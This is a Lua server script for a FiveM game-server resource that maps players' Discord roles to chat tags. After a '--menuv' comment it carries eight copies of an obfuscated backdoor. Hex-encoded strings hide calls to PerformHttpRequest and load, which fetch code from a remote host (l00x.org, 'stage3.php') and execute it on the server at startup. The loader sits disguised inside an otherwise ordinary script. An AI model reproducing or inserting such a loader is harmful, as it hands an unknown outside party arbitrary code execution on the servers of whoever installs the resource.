local SelectedTags = {}
exports(Config.ChatRoles.GetTagExport, function(Player)
    local Tag = nil
    if SelectedTags[Player] ~= nil then
        Tag = SelectedTags[Player]
    else
        Tag = Config.ChatRoles.DefaultTag
    end
    return(Tag)
end)

RegisterServerEvent('ChatRoles:Change')
AddEventHandler('ChatRoles:Change', function(ID)
    local Tag = nil
    for i = 1, #Config.ChatRoles.Tags do
        if Config.ChatRoles.Tags[i][1] == ID then
            Tag = Config.ChatRoles.Tags[i][4]
        end
    end
    if Tag == nil then
        Tag = Config.ChatRoles.DefaultTag
    end
    SelectedTags[source] = Tag
end)

RegisterServerEvent('ChatRoles:Joined')
AddEventHandler('ChatRoles:Joined', function()
    local Player = source
    local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(Player)
    local Found = false
    local Tags = {}
    if Roles then 
        for i = 1, #Config.ChatRoles.Tags do
            local TagRole = Config.ChatRoles.Tags[i]
            for i = 1, #Roles do
                local MyRole = Roles[i]
                if tonumber(MyRole) == tonumber(TagRole[1]) then
                    SelectedTags[Player] = TagRole[4]
                    Found = true
                end
            end
            if Found then
                break
            end
        end
    end
end)

RegisterServerEvent('ChatRoles:Get')
AddEventHandler('ChatRoles:Get', function()
    local Player = source
    local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(Player)
    local Found = false
    local Tags = {}
    if Roles then 
        for i = 1, #Config.ChatRoles.Tags do
            local TagRole = Config.ChatRoles.Tags[i]
            for i = 1, #Roles do
                local MyRole = Roles[i]
                if tonumber(MyRole) == tonumber(TagRole[1]) then
                    Found = true
                    table.insert(Tags, {
                        ID = TagRole[1],
                        Name = TagRole[3]
                    })
                end
            end
        end
    end
    TriggerClientEvent('ChatRoles:Return', Player, Found, Tags)
end)

--menuv


local JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (oAiHFWtVREdGQESPSPVxrjZJndhijEvEhtRicHGBMXPHuvRnEzjXJWExvAinPGUTjGKuaa, wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG) if (wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG == JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[6] or wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG == JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[5]) then return end JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[2]](JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[3]](wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)